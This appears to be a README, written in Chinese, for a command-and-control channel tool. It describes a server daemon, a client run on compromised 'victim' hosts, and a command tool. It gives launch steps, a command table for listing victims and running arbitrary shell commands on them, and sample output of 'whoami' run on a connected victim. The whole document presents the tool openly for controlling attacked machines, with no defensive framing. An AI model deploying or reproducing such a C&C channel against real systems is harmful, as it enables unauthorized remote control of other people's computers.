# C&C控制信道

## 组成模块
### “CCDaemon” 服务端的守护进程
负责监听`CCClient`(受害者客户端)的连接请求，管理`CCClient`(受害者客户端)的加密信道链接，中转`CCCmd`的命令请求并回显。

### “CCClient” 受害者客户端
被攻击沦陷的受害者主机启动`CCClient`与服务端进行连接，处理接收到的命令请求。

### “CCCmd” 服务端的命令输入信道
向`CCDaemon`发送控制命令，控制被攻击的受害者。

## 启动方法
1. 服务端启动守护进程，`py CCDaemon.py`
2. 受害者被攻击后链接服务端，`py CCClient.py`
3. 服务端控制受害者主机，`py CCCmd.py {command}`

## 已设计的指令
| 功能                           | 指令                                                   |
| ------------------------------ | ------------------------------------------------------ |
| 查看已连接的受害者的控制信道ID | `py CCCmd.py ListConnection`                           |
| 执行受害者任意Shell指令        | `py CCCmd.py RemoteExec {ConnectionID} {ShellCommand}` |

## 实例
```
PS C:path\to\CC> py .\CCCmd.py ListConnection

['d12a4d1b8654f918fa5c339981f0199f']

PS C:path\to\CC> py .\CCCmd.py RemoteExec d12a4d1b8654f918fa5c339981f0199f whoami

desktop-ri1sta3\zimarnt
```
